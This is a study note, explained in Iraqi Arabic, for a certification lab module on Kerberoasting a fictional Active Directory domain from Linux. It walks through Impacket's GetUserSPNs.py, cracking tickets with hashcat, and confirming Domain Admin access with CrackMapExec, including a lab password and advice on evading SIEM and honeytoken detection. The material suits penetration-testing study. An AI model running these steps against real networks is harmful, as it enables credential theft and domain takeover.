---
title: "SEC 18: Kerberoasting - from Linux"
module: "Active Directory Enumeration & Attacks"
section_num:
  - "18"
target: "INLANEFREIGHT.LOCAL"
tags:
  - CPTS
  - Active-Directory
  - Kerberoasting
difficulty: "Medium"
vectors: "LDAP / Kerberos"
tools: "GetUserSPNs.py · Hashcat · CrackMapExec"
status: 🟢 Complete
date: "2026-07-31"
---

> [!info] ⚙️ T4E CYBERPUNK NOTES ✦ CPTS CERTIFICATION PATHWAY
> 📍 **TARGET NODE:** INLANEFREIGHT.LOCAL
> 🔐 **ACCESS LEVEL:** Authenticated Domain User
> 📡 **ATTACK VECTOR:** LDAP / Kerberos
> 📋 **SECTION ID:** SEC-18
> ⚡ **DIFFICULTY:** 🟢 Medium
> 🏁 **STATUS:** 🟢 ONLINE — COMPLETE
> 🛠️ **KEY TOOLS:** GetUserSPNs.py · Hashcat · CrackMapExec
> 🎯 **CORE OBJECTIVE:** Extract and crack service tickets
> 📅 **DATE:** 2026-07-31

```text
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║                      ████████╗██╗  ██╗███████╗                       ║
║                      ╚══██╔══╝██║  ██║██╔════╝                       ║
║                         ██║   ███████║█████╗                         ║
║                         ██║   ╚════██║██╔══╝                         ║
║                         ██║        ██║███████╗                       ║
║                         ╚═╝        ╚═╝╚══════╝                       ║
║                                                                      ║
║                       [ TECH FOR EVERYONE ]                          ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║  [SYS]      :: NODE INITIALIZED — T4E NOTES v2.0                     ║
║  [SECTION]  :: SEC-[NUM] // [REPLACE: SECTION_TITLE]                 ║
║  [DOMAIN]   :: [REPLACE: TARGET_DOMAIN.LOCAL]                        ║
║  [OPERATOR] :: Hexsein · Al-Nahrain University · CPTS Candidate      ║
║  [CLEARANCE]:: Level-3 // Penetration Testing Pathway                ║
╚══════════════════════════════════════════════════════════════════════╝
```

## ⚡ PHASE_I — النواة النظرية :: المفاهيم والبنية التحتية

> [!success] 📡 PHASE I INITIALIZED · THEORETICAL CORE UPLOAD
> **Language:** Arabic — **Size:** ~2,000 Words
> **Content:** Deep conceptual framework · Infrastructure theory · Hacker mindset · Big picture.

[تمام! استلمت نص السكشن. خلني أشرحلك إياه من الألف للياء:

🟢 Big Picture → 🔵 خريطة المفاهيم → 🟡 هيكل السكشن → 🟠 الشرح العميق → 🔴 ما لا يقوله السكشن → 💎 فلاشكاردز → 📄 ورقة غش السكشن

يله نبدأ...

━━━━━

## 🟢 المرحلة 0: Big Picture — ليش هذا الموضوع موجود أصلاً؟

تخيل وياي هذا المشهد بحياتنا اليومية: أنت تشتغل بشركة ضخمة، وكل موظف عنده "باج" إلكتروني (هوية) يفتح بيه أبواب الأقسام اللي مسموحله يدخلها. بالشركة اكو غرفة مهمة جداً اسمها "غرفة السيرفرات الرئيسية"، وعليها حارس. حتى تدخل لهي الغرفة، النظام بالشركة يكول: "روح لمكتب الاستعلامات المركزي (Domain Controller)، انطيهم باجك، وكللهم أريد ورقة مرور (Ticket) لغرفة السيرفرات".

الاستعلامات راح يتأكدون إنك موظف حقيقي، وينطوك ورقة مرور. بس هاي الورقة **مقفلة بقفل خاص** ما ينفتح إلا بمفتاح (باسورد) الموظف المسؤول عن غرفة السيرفرات. المفروض أنت تاخذ هاي الورقة المقفلة، تنطيها لموظف السيرفرات، وهو يفتحها ويسمحلك بالدخول.

**هنا يكمن الخلل الجوهري والتصميم الكارثي (The Root Flaw):**

شنو اللي يمنعك أنت كموظف عادي إنك تاخذ هاي الورقة المقفلة، وتحطها بجيبك، وتطلع من الشركة وتروح لبيتك؟ بالبيت، تكدر تجيب دريل، ومناشير، ومعدات كسر (Brute-force/Dictionary Attack) وتحاول تكسر القفل براحتك، بدون ما الاستعلامات يدرون بيك، وبدون ما كاميرات الشركة تصورك! إذا كان باسورد موظف السيرفرات ضعيف (مثل Password123)، راح تكسر القفل، وتعرف باسورده، وثاني يوم تجي للشركة وتدخل بصلاحياته كمدير!

هذا هو هجوم **Kerberoasting** بالضبط. في بيئة Windows Active Directory، الخدمات (مثل قواعد البيانات SQL، أو خوادم الويب) تحتاج حسابات حتى تشتغل. ولأن الحسابات المحلية (Local System) ما تكدر تتواصل عبر الشبكة بسهولة، مدراء النظام (IT Admins) يسوون حسابات مستخدمين عادية (Domain Users) ويخلونها تشغل هاي الخدمات. ويربطون هاي الحسابات بشيء اسمه "اسم مدير الخدمة" (SPN).

بروتوكول Kerberos مصمم بطريقة تجبره يعطيك "تذكرة خدمة" (TGS) مشفرة بباسورد حساب الخدمة، بمجرد أن تطلبها (حتى لو كنت أضعف مستخدم بالشبكة). المهاجم ياخذ هاي التذكرة لبيئته الخاصة (Linux/Kali/Parrot) ويكسرها أوفلاين (Offline Cracking).

**ليش هذا السكشن مخصص للـ Linux؟**

السكشن السابق علمنا شلون نسوي هذا الهجوم من داخل بيئة Windows نفسها. بس بالواقع، أنت كـ Pentester، أحياناً ما عندك حاسبة ويندوز مخترقة. أحياناً أنت كاعد ورا حاسبتك اللينكس (Kali أو Parrot)، وما متصل بالدومين كجهاز (Non-domain joined)، بس حصلت "يوزر وباسورد" عاديين من هجوم Phishing أو من ملف مسرب. هذا السكشن يعلمك شلون تستخدم أدوات مبنية بلغة Python (مثل حزمة Impacket) حتى تحاكي لغة الويندوز وتطلب التذاكر وتسرقها وأنت مرتاح ببيئة اللينكس مالتك.

**وين هذا السكشن يقع بخريطة CPTS؟**

هذا السكشن هو درة تاج مرحلة ما بعد الاختراق (Post-Exploitation) وتصعيد الصلاحيات (Privilege Escalation) والتحرك الجانبي (Lateral Movement). هو الخطوة اللي تنقلك من "مستخدم عادي ماله قيمة" إلى "مدير شبكة (Domain Admin)" في حال كان حساب الخدمة يمتلك صلاحيات عالية.

**شنو راح تكون قادر تسوي بعد ما تفهم هالسكشن؟**

1. راح تكدر تتصل بالـ Active Directory من نظام Linux غير مرتبط بالدومين.
    
2. راح تتعلم شلون تستخرج كل حسابات الـ SPNs وتحدد منو بيها يملك صلاحيات عالية (Domain Admins).
    
3. راح تستخدم أداة `GetUserSPNs.py` لسحب التذاكر وحفظها بصيغة جاهزة للكسر.
    
4. راح تكسر التذاكر باستخدام Hashcat، وتتأكد من صلاحياتك الجديدة بالشبكة.
    

━━━━━

## 🔵 المرحلة 1: خريطة المفاهيم

حتى لا تصير الأوامر مجرد طلاسم، لازم نفكك المصطلحات التقنية اللي وردت بالنص ونفهمها بالعراقي البسيط:

**1. Service Principal Name (SPN)**

- **شنو يعني بالعراقي البسيط؟** هو "الرقم الوظيفي" أو "اليافطة" اللي تتعلق على باب الخدمة. الويندوز شبكة ضخمة، حتى الكمبيوتر يندل وين يروح لمن يريد خدمة معينة، لازم الخدمة تسجل نفسها بالشبكة وتكول: "أني خدمة قاعدة البيانات (MSSQL)، وموجودة على السيرفر الفلاني، والحساب اللي يشغلني اسمه كذا".
    
- **وين يظهر؟** يظهر بالـ Output مال أداة Impacket هيج: `MSSQLSvc/SPSJDB.inlanefreight.local:1433`.
    
- **ليش يهمنا؟** لأن Kerberoasting ما يشتغل إلا على الحسابات اللي عندها SPN.
    

**2. Service Account (حساب الخدمة)**

- **شنو يعني بالعراقي البسيط؟** هو يوزر عادي بالـ Active Directory، بس الموظف الـ IT ما سواه لشخص بشري (مثل أحمد أو علي)، سواه حتى يخلي برنامج (مثل SQL Server أو Exchange) يشتغل ويسجل دخول بيه.
    
- **المشكلة الكارثية:** لأن هذا مو بشر، مدراء النظام يتعاجزون يغيرون باسورده كل فترة (حتى لا توكف الخدمة)، وغالباً يخلوه باسورد سهل، والأدهى من هذا، ينطونه صلاحيات "مدير شبكة" (Domain Admin) حتى البرنامج يشتغل بدون مشاكل. وهذا هو الصيد الثمين مالتنا.
    

**3. TGS-REP (Ticket Granting Service Reply)**

- **شنو يعني بالعراقي البسيط؟** هي "تذكرة الدخول" اللي تكلمنا عليها بالقصة. من تطلب من الـ DC إنك تريد تتصل بخدمة، الـ DC يرد عليك برسالة اسمها TGS-REP. هاي الرسالة تحتوي على التذكرة اللي مشفرة بباسورد حساب الخدمة (NTLM Hash). هاي التذكرة هي اللي راح نسرقها ونكسرها.
    

**4. Offline Cracking (الكسر خارج الاتصال)**

- **شنو يعني بالعراقي البسيط؟** تخيل أنت تجرب مفاتيح على قفل باب حقيقي بالشارع. إذا جربت 5 مفاتيح غلط، الحارس راح يصيدك (هذا Online Brute-force، والويندوز يقفل الحساب بعد 5 محاولات). الـ Offline Cracking هو إنك تاخذ القفل للبيت، وتجرب عليه مليون مفتاح بالثانية بدون ما أحد يحس بيك، وبدون ما الحساب ينقفل بالشركة. هنا نستخدم برنامج Hashcat على كروت شاشة قوية.
    

**5. Impacket Toolkit**

- **شنو يعني بالعراقي البسيط؟** الويندوز يحجي لغة خاصة بيه (RPC, SMB, Kerberos). اللينكس (مثل كالي) ما يفتهم هاي اللغة بشكل افتراضي. حزمة `Impacket` هي عبارة عن سكربتات مكتوبة بلغة Python تعمل كـ "مترجم". تخلي جهازك اللينكس يحجي ويا الويندوز وكأنه جهاز ويندوز أصلي. أداة `GetUserSPNs.py` هي وحدة من هاي السكربتات.
    

**6. Cleartext Password vs. NTLM Hash**

- **شنو يعني بالعراقي البسيط؟** الـ Cleartext هو الباسورد العادي اللي تكتبه بيدك (مثل `database!`). الـ NTLM Hash هو النسخة المشفرة مالته اللي تنحفظ بالويندوز (مثل `81f3efb5827a05f6ca1...`). الأداة اللي راح نستخدمها تقبل تنطيها باسورد عادي، أو تنطيها Hash حتى تثبت هويتك للـ DC وتبدأ الهجوم.
    

━━━━━

## 🟡 المرحلة 2: هيكل السكشن — شنو يعلّمك وكيف؟

**موضوع السكشن:** هجوم Kerberoasting من بيئة اللينكس (Kerberoasting - from Linux). السكشن يشرحلك شلون تنفذ هذا الهجوم الشهير إذا كانت حاسبتك الهجومية تعمل بنظام Linux، باستخدام حزمة أدوات مفتوحة المصدر.

🎯 **ماذا يريد هذا السكشن أن تتعلم؟**

1. فهم لماذا حسابات الخدمات (Service Accounts) تمثل نقطة ضعف استراتيجية في الشبكات (غالباً يملكون صلاحيات عالية وباسوردات ضعيفة).
    
2. تثبيت وتجهيز حزمة Impacket على نظام Linux.
    
3. استخراج قائمة بكل الحسابات المرتبطة بـ SPN ومعرفة صلاحياتها ومجموعاتها (Group Membership).
    
4. طلب تذاكر TGS للحسابات المستهدفة وحفظها بصيغة جاهزة للكسر.
    
5. استخدام Hashcat لكسر التذكرة واستخراج كلمة المرور، ثم التحقق من الصلاحيات باستخدام CrackMapExec.
    

📐 **هيكل المحتوى (Section Blueprint):**

السكشن مصمم كرحلة اختراق واقعية (End-to-End)، يبدأ من النظرية وينتهي بالسيطرة الكاملة:

```
[1. النظرة العامة (Theory & Overview)]
       │   شرح المفهوم، وكيف ولماذا تمتلك حسابات الخدمات صلاحيات عالية (Domain Admins).
       ▼
[2. فعالية الهجوم (Efficacy of the Attack)]
       │   توضيح متى يكون الهجوم High Risk (حصلت باسورد قوي أو Domain Admin) ومتى يكون Medium Risk.
       ▼
[3. التحضير والتثبيت (Setup & Installation)]
       │   تثبيت حزمة Impacket عبر Python Pip.
       ▼
[4. الاستطلاع (Enumeration)]
       │   تشغيل GetUserSPNs.py لمعرفة الحسابات المتاحة وصلاحياتها.
       ▼
[5. التنفيذ والاستخراج (Execution & Extraction)]
       │   استخدام الـ flags (-request و -outputfile) لسحب التذاكر.
       ▼
[6. الكسر والتحقق (Cracking & Validation)]
       │   كسر التذكرة بـ Hashcat، وتجربة الباسورد الجديد بـ CrackMapExec للوصول للسيرفر.
```

🔗 **المتطلبات السابقة:**

حتى تفهم وتطبق هذا السكشن، السكشن يفترض إنك:

1. تمتلك اسم مستخدم وكلمة مرور (أو هاش) لحساب عادي (Standard User) داخل الدومين. (بدون يوزر عادي، ما تكدر تطلب أي تذكرة).
    
2. تعرف عنوان الـ IP الخاص بالـ Domain Controller.
    
3. تعرف أساسيات التعامل مع Terminal في Linux وتثبيت أدوات Python.
    

⚠️ **ما يذكره السكشن ضمنياً (الافتراضات المخفية):**

1. **دقة الوقت (Time Synchronization):** بروتوكول Kerberos حساس جداً للوقت. إذا كان وقت حاسبتك اللينكس يختلف عن وقت الـ Domain Controller بأكثر من 5 دقائق، أداة `GetUserSPNs.py` راح تفشل وتنطيك أخطاء (Kerberos SessionError). السكشن افترض إنك مساوي الوقت مسبقاً.
    
2. **تحليل الـ Risk:** السكشن يذكر إنك كمختبر اختراق (Pentester) لازم تعرف شلون تصيغ التقرير. إذا ما كدرت تكسر التذكرة، لا تكتب بالتقرير إن الشبكة مخترقة، بل اكتب "مخاطرة متوسطة" (Medium Risk) لوجود SPNs، وهذا يعلمك الأمانة المهنية بالتقارير.
    

━━━━━

## 🟠 المرحلة 3: الشرح العميق

وصلنا للجزء الأهم، الشرح العملي التفصيلي لكل أمر ذكره السكشن. راح نفككه قطعة قطعة ونشرحه مثل ما يشرح المهندس لصديقه.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### 🔷 المفهوم/التقنية 1: تثبيت حزمة Impacket (The Setup)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 **بالعراقي البسيط:**

تخيل حزمة Impacket هي "صندوق العدة" السحري الخاص بيك. هاي الحزمة عبارة عن كودات مكتوبة بلغة بايثون، تخلي اللينكس مالتك يحجي لغة الويندوز. السكشن يبدأ بتعليمنا شلون ننزل هاي الحزمة ونثبتها بالنظام حتى نكدر نشغل سكربتاتها من أي مكان.

🔬 **ليش يعمل هيج؟ (المبدأ الجوهري):**

اللينكس ما يحتوي على مكتبات داخلية للتعامل مع بروتوكولات Microsoft المعقدة مثل SMB أو Kerberos أو RPC. فريق اسمه SecureAuth (سابقاً Core Security) كتبوا هاي المكتبات من الصفر بالبايثون. حتى نثبتها صح ونخلي النظام يتعرف عليها، نستخدم أداة إدارة الحزم مال بايثون اللي هي `pip`.

🔧 **الأمر:**

Code snippet

```
H4xHussein@htb[/htb]$ sudo python3 -m pip install .
```

💬 **شرح الـ flags:**

- `sudo`: نحتاج صلاحيات الجذر (root) حتى نثبت الأداة على مستوى النظام كله.
    
- `python3 -m pip`: نستدعي أداة تثبيت الحزم (pip) الخاصة بالإصدار الثالث من بايثون.
    
- `install .`: النقطة (`.`) هنا مو عبث! معناها: "ثبت الحزمة الموجودة في الفولدر الحالي اللي أني كاعد بيه هسة". (طبعاً لازم تكون مسوي `git clone` وداخل لمجلد impacket قبل هذا الأمر).
    

📤 **الـ Output المتوقع:**

الـ Output راح يراويك إنه دا يحمل ملفات الاعتماديات (Dependencies) مثل `ldap3` و `flask` ويثبتها بالنظام:

Code snippet

```
Processing /opt/impacket
  Preparing metadata (setup.py) ... done
Requirement already satisfied: chardet ...
```

⏸️ **نقطة توقف:** هسة حاسبتنا اللينكس صارت جاهزة وتتكلم "لغة ويندوز" بطلاقة. حان وقت استكشاف الشبكة.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### 🔷 المفهوم/التقنية 2: استكشاف الحسابات (Listing SPNs)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 **بالعراقي البسيط:**

قبل لا نسرق التذاكر، لازم نعرف "منو" الموجود بالشبكة. راح نستخدم أداة `GetUserSPNs.py` ونتصل بموظف الاستعلامات (الـ Domain Controller) ونكله: "بلا زحمة، انطينا قائمة بكل الخدمات الموجودة بالشركة، ومنو الموظفين (اليوزرات) اللي يشغلوها، وشنو مناصبهم (Group Membership)".

🎭 **التشبيه:**

كأنما تطلب "الهيكل التنظيمي" للشركة، وتدور بيه على الموظفين اللي عندهم صلاحيات يوقعون شيكات مالية (Domain Admins)، حتى تركز هدفك عليهم وماتضيع وقتك ويا موظفين صغار.

🔬 **ليش يعمل هيج؟ (المبدأ الجوهري):**

السكربت يتصل بقاعدة بيانات الـ Active Directory (باستخدام بروتوكول LDAP)، ويسوي بحث (Query) عن كل الحسابات اللي عندها Attribute اسمه `servicePrincipalName` مو فارغ. وبنفس الوقت، يقرأ الـ Attributes مال هذا الحساب مثل `MemberOf` حتى يراويك صلاحياته.

🔧 **الأمر:**

Code snippet

```
H4xHussein@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

💬 **شرح الـ flags:**

- `GetUserSPNs.py`: اسم السكربت.
    
- `-dc-ip 172.16.5.5`: نحدد الـ IP مال الـ Domain Controller، لأنمرات الدومين نيم ما ينقري صح باللينكس (DNS issues).
    
- `INLANEFREIGHT.LOCAL/forend`: ننطيه اسم الدومين متبوعاً باسم اليوزر العادي اللي نملكه (forend). السكربت راح يطلب منك الباسورد المخفي.
    

📤 **الـ Output المتوقع:**

هذا الـ Output هو كنز حقيقي، ركز بيه:

Code snippet

```
ServicePrincipalName                           Name               MemberOf                                             PasswordLastSet
---------------------------------------------  -----------------  ---------------------------------------------------  --------------------------
backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:40.842452
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL   2022-02-15 17:09:46.326865
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:13:31.639334
```

🔍 **كيف تقرأ الـ Output؟:**

- **عمود ServicePrincipalName:** هذا اسم الخدمة. مثلاً `MSSQLSvc` يعني قاعدة بيانات SQL.
    
- **عمود Name:** اسم اليوزر اللي يشغل الخدمة (مثلاً `sqldev`).
    
- **عمود MemberOf (الأهم!):** هذا يكولك اليوزر لأي مجموعة ينتمي. باوع على يوزر `sqldev`، هو عضو بـ `CN=Domain Admins`! يعني هذا اليوزر هو إله بالشبكة (مدير عام). إذا كسرنا باسورده، فزنا باللعبة كلها!
    
- **عمود PasswordLastSet:** يكولك شوكت آخر مرة غير باسورده. (لو كان متغير من 10 سنين، معناها الباسورد زبالة وراح ينكسر بثواني).
    

❓ **الـ "بس ليش؟" — أسئلة شائعة:**

- _ليش ما نطلب التذاكر مباشرة بدل ما نستكشف؟_
    
    لأن إذا الشبكة بيها 500 خدمة، وطلبت 500 تذكرة بثانية وحدة، أنظمة المراقبة (SIEM/SOC) راح تصفر وتصيدك فوراً. الاستكشاف يخليك تختار هدفك بذكاء (تستهدف الـ Domain Admins فقط).
    

⏸️ **نقطة توقف:** هسة عرفنا منو أهدافنا. الهدف الأثمن هو يوزر `sqldev` لأنه `Domain Admin`. الخطوة الجاية: نسرق تذكرته.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### 🔷 المفهوم/التقنية 3: طلب وسحب التذاكر (-request و -outputfile)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 **بالعراقي البسيط:**

هسة راح نكول للسكربت: "عاشت إيدك، عرفنا الأهداف. هسة روح اطلبلي تذكرة الدخول (TGS) ليوزر sqldev تحديداً، واكتبلي الهاش مال التذكرة بملف نظيف حتى أخذه لبرنامج الكسر".

🔬 **ليش يعمل هيج؟ (المبدأ الجوهري):**

السكربت راح يبني رسالة `TGS-REQ` (طلب تذكرة خدمة) ويرسلها للـ KDC (اللي هو الـ Domain Controller). الـ KDC ما راح يتحقق إذا كنا إحنا فعلاً نريد نستخدم الخدمة أم لا، راح يرد علينا مباشرة برسالة `TGS-REP` تحتوي على التذكرة المشفرة بباسورد الـ `sqldev`. السكربت راح يستلمها، يفككها، ويستخرج منها الجزء اللي نحتاجه ونكدر نكسره.

Plaintext

```
رسم توضيحي للعملية (ASCII Diagram):

[حاسبتك اللينكس]                              [Domain Controller (KDC)]
       │                                                 │
       ├── TGS-REQ (أريد تذكرة لخدمة MSSQLSvc/sqldev) ──►│
       │                                                 │
       │◄── TGS-REP (تفضل التذكرة مشفرة بباسورد sqldev)──┤
       │                                                 │
[يتم حفظ التذكرة بملف للكسر الأوفلاين]
```

🔧 **الأمر:**

Code snippet

```
H4xHussein@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

💬 **شرح الـ flags:**

- `-request-user sqldev`: هذا الـ flag الذكي يخليك تستهدف يوزر واحد فقط (sqldev). (السكشن ذكر أمر `-request` لوحده، وهذا يسحب كل التذاكر بالشبكة، بس هذا مكشوف وصوته عالي. الأفضل نكون دقيقين).
    
- `-outputfile sqldev_tgs`: هذا الـ flag يحل مشكلة كبيرة. بدل ما التذكرة (الهاش) تنطبع على الشاشة وتصير هوسة وتضطر تنسخها بيدك وتغلط بالفراغات، السكربت راح يحفظها بشكل نظيف داخل ملف اسمه `sqldev_tgs`.
    

📤 **الـ Output المتوقع:**

السكربت راح يطبع الجدول مرة ثانية، بس بالخلفية راح يصنع ملف `sqldev_tgs`، إذا قرينا الملف راح نلكى بي هاش طويل يبدي بهيج شكل:

Plaintext

```
$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$81f3efb5827a05f6ca1...
```

_(هذا الهاش هو التذكرة المشفرة، ورقم `23` يعني التشفير هو RC4، وهو تشفير ضعيف جداً وحلو لبرامج الكسر)._

⏸️ **نقطة توقف:** السرقة تمت بنجاح وبدون ما يحس الـ KDC. التذكرة هسة بجيبنا (بملف `sqldev_tgs`). ننتقل لمرحلة كسر القفل.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### 🔷 المفهوم/التقنية 4: كسر التذكرة أوفلاين (Hashcat)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 **بالعراقي البسيط:**

أخذنا التذكرة المقفولة لبيتنا. هسة راح نشغل دريل ضخم (برنامج Hashcat) ونخلي وياه موسوعة ضخمة مال باسورادت (rockyou.txt)، ونكله: "جرب كل هاي الباسوردات بسرعة البرق لحد ما ينفتح القفل".

🔬 **ليش يعمل هيج؟ (المبدأ الجوهري):**

الـ Hashcat هو برنامج يستغل قوة المعالج (CPU) أو كارت الشاشة (GPU) حتى يطبق خوارزمية التشفير على كل كلمة بالقاموس ويقارن النتيجة ويا الهاش اللي سرقناه. إذا تطابقوا، معناها لكى الباسورد. نوع التشفير اللي يبدي بـ `$krb5tgs$23$` هو (RC4 HMAC-MD5)، وهو خوارزمية ضعيفة المعالج يكدر يجرب بيها ملايين الاحتمالات بالثانية.

🔧 **الأمر:**

Code snippet

```
H4xHussein@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

💬 **شرح الـ flags:**

- `-m 13100`: حرف الـ m يعني Mode (الوضع). رقم 13100 هو المعرف الخاص بخوارزمية (Kerberos 5, etype 23, TGS-REP) ببرنامج Hashcat. (لازم تحفظه).
    
- `sqldev_tgs`: اسم الملف اللي بيه الهاش المسروق.
    
- `/usr/share/wordlists/rockyou.txt`: مسار القاموس الشهير (rockyou) اللي بيه ملايين الباسوردات المسربة.
    

📤 **الـ Output المتوقع:**

بعد ثواني، راح تظهرلك الشاشة الخضراء الجميلة:

Code snippet

```
...c1f:database!
Session..........: hashcat
Status...........: Cracked
Time.Started.....: Tue Feb 15 17:45:29 2022, (10 secs)
Speed.#1.........:   821.3 kH/s (11.88ms) 
```

🔍 **كيف تقرأ الـ Output؟:**

- **`database!`**: هذا هو الباسورد الصافي (Cleartext)! لكيناه بنهاية الهاش بعد النقطتين الراسيتين `:`.
    
- **`Status: Cracked`**: يعني العملية نجحت وتم الكسر.
    
- **`Speed`**: سرعة الكسر، هنا 821 كيلو هاش بالثانية. (تخيل 821 ألف محاولة بالثانية!).
    
- **`Time.Started`**: الكسر أخذ 10 ثواني بس! (لأن الباسورد ضعيف والتشفير RC4).
    

⏸️ **نقطة توقف:** هسة إحنا صرنا نملك اسم اليوزر (`sqldev`) والباسورد (`database!`). تذكر إن هذا اليوزر هو Domain Admin؟ خلي نتأكد.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### 🔷 المفهوم/التقنية 5: التحقق من الصلاحيات (CrackMapExec)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 **بالعراقي البسيط:**

مو أي باسورد نكسره يعني صرنا أبطال. لازم نتأكد إن الباسورد يشتغل، ونتأكد شنو صلاحياتنا الحقيقية بالشبكة. راح نستخدم أداة مثل السكين السويسري اسمها `CrackMapExec` (أو حالياً معروفة بـ NetExec) حتى نرمي هذا الباسورد بوجه السيرفر ونشوف شيكولنا.

🔬 **ليش يعمل هيج؟ (المبدأ الجوهري):**

الأداة تتصل بالسيرفر عبر بروتوكول SMB (اللي مسؤول عن مشاركة الملفات وإدارة النظام عن بعد) وتحاول تسجل دخول باليوزر والباسورد اللي حصلناهم. إذا نجحت، راح تفحص صلاحيات اليوزر الإدارية على هذا السيرفر وترجعلك النتيجة.

🔧 **الأمر:**

Code snippet

```
H4xHussein@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

💬 **شرح الـ flags:**

- `smb`: البروتوكول اللي راح نفحصه.
    
- `172.16.5.5`: آي بي الـ Domain Controller اللي نريد نسيطر عليه.
    
- `-u sqldev`: اسم اليوزر اللي كسرناه.
    
- `-p database!`: الباسورد اللي طلعناه من Hashcat.
    

📤 **الـ Output المتوقع:**

Code snippet

```
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!)
```

🔍 **كيف تقرأ الـ Output؟:**

- `[+]`: العلامة الخضراء تعني إن الباسورد صحيح 100% والـ Authentication نجح.
    
- `(Pwn3d!)`: هاي الكلمة الذهبية! بالـ CrackMapExec، كلمة `Pwn3d!` (تم الاختراق) تظهر فقط وفقط إذا كان هذا اليوزر يمتلك صلاحيات **Local Administrator** على الهدف. ولأن الهدف هو Domain Controller، فهذا يعني رسمياً إنك صرت **Domain Admin** وسيطرت على الشركة بالكامل!
    

📊 **ملخص ما تعلمنا:**

|**المفهوم / الأداة**|**ما يعني ويعمل**|**متى تستخدمه**|
|---|---|---|
|`pip install .`|تثبيت أدوات Impacket|مرة واحدة لتحضير بيئة اللينكس للاختراق.|
|`GetUserSPNs.py`|استخراج الحسابات ذات الـ SPNs وسحب تذاكرها|للاستطلاع (Enumeration) وسرقة التذاكر من اللينكس.|
|`-request-user`|سحب تذكرة لحساب واحد محدد|للاستنقاء الجراحي وتجنب إثارة الإنذارات.|
|`Hashcat -m 13100`|كسر هاش Kerberos RC4 (TGS-REP)|لتحويل التذكرة المشفرة إلى باسورد صافي.|
|`CrackMapExec`|فحص الصلاحيات الإدارية|للتأكد من نجاح الباسورد ومعرفة إن كنا Pwn3d!|

━━━━━

## 🔴 المرحلة 4: ما لا يقوله السكشن

هذه المرحلة هي اللي تفصل بين "طالب يطبق خطوات اللاب" و"مختبر اختراق محترف يواجه العالم الحقيقي". اكو هواي تفاصيل السكشن غض النظر عنها لتبسيط الأمور:

🕳️ **الثغرات في شرح السكشن:**

1. **مشكلة مزامنة الوقت (Time Skew Error):** السكشن ما ذكر إن بروتوكول Kerberos عنده قاعدة ذهبية: "لازم وقت المهاجم ووقت السيرفر يكون الفرق بينهم أقل من 5 دقائق". باللينكس مالتك (Kali/Parrot)، إذا الوقت ما مضبوط، `GetUserSPNs.py` راح يطبعلك خطأ أحمر طويل `Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`. الحل؟ لازم تنصب أداة `ntpdate` وتزامن وقتك ويا الـ DC، أو تستخدم أمر `net rpc info` حتى تقرأ وقت السيرفر وتغير وقت حاسبتك يدوياً.
    
2. **مشكلة تحليل الـ DNS:** أدوات Impacket تعشق أسماء الدومين وتكره الـ IP في بعض استعلامات Kerberos (لأن الكيربروس يعتمد على الاسم). السكشن استخدم `-dc-ip` وهذا قلل المشكلة، بس أحياناً يطلب منك اسم الدومين الكامل. إذا اللينكس مالتك ما يكدر يترجم `INLANEFREIGHT.LOCAL` إلى آي بي، الأداة راح تفشل. لازم دائماً تضيف الـ IP واسم الدومين واسم السيرفر بملف `/etc/hosts` باللينكس مالتك قبل لا تبدأ أي هجوم AD.
    

⚠️ **الـ Gotchas عند تطبيق هذا بالـ Lab (فخوخ شائعة):**

1. **استخدام `-request` بدون تحديد:** باللاب ممكن تسويها وتنجح لأن اللاب صغير (3 يوزرات). ببيئة حقيقية (Enterprise)، إذا استخدمت `-request` بدون تخصيص، راح تسحب 2000 تذكرة، وهذا راح يخلي ملف الـ Output ضخم جداً ومليان حسابات كمبيوترات وأشياء مالها داعي، وراح يطول الكسر لأيام. دائماً استكشف أولاً، ثم اسحب تذاكر الـ `Domain Admins` أو اليوزرات المتميزة فقط باستخدام `-request-user`.
    
2. **فخ الـ Honey-SPNs:** بالواقع (Real Pentest)، فريق الحماية (Blue Team) يسوون حسابات وهمية يسموها "Honeytokens"، يعطوها SPN واسم جذاب مثل `SQLAdmin`، ويخلون باسورداها وهمي. إذا أنت سحبت تذكرة هذا الحساب وحاولت تكسرها أو تستخدمها، راح يدك إنذار عندهم ويكولهم "اكو مهاجم بالشبكة سحب فخ العسل!". لذلك، افحص الحسابات بالـ BloodHound قبل لا تسحب تذاكرها شوف إذا كانت نشطة فعلاً أو مجرد فخ.
    

🔗 **ربط بسكاشن/موديولات أخرى:**

استخدام حزمة Impacket راح يرافقك بكل مسار الـ CPTS. أداة `GetUserSPNs.py` هي أخت أداة `GetNPUsers.py` (التي تستخدم لهجوم AS-REPRoasting)، ونفس مفهوم التذاكر موجود بموديول `Attacking Enterprise Networks`.

🌍 **السياق الحقيقي (Real Pentest Context):**

